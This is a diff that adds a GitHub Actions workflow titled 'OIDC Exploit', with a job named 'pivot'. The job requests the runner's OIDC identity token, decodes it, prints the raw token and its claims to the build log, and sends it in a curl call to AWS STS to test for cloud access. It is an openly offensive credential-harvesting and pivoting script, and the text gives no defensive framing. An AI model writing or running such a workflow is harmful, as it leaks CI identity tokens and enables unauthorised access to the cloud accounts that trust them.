@@ -1,0 +1,29 @@
+name: OIDC Exploit
+on: workflow_dispatch
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  pivot:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Get OIDC Token
+        id: oidc
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const token = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
+            const url = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
+            const resp = await fetch(url + '&audience=github-audience');
+            const data = await resp.json();
+            const decoded = JSON.parse(Buffer.from(data.value.split('.')[1], 'base64').toString());
+            console.log('OIDC_CLAIMS:', JSON.stringify(decoded));
+            console.log('OIDC_TOKEN:', data.value);
+            core.setOutput('token', data.value);
+      
+      - name: Try AWS
+        if: true
+        run: |
+          echo "Trying AWS..."
+          curl -s -H "Authorization: Bearer ${{ steps.oidc.outputs.token }}" \
+            "https://sts.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15"
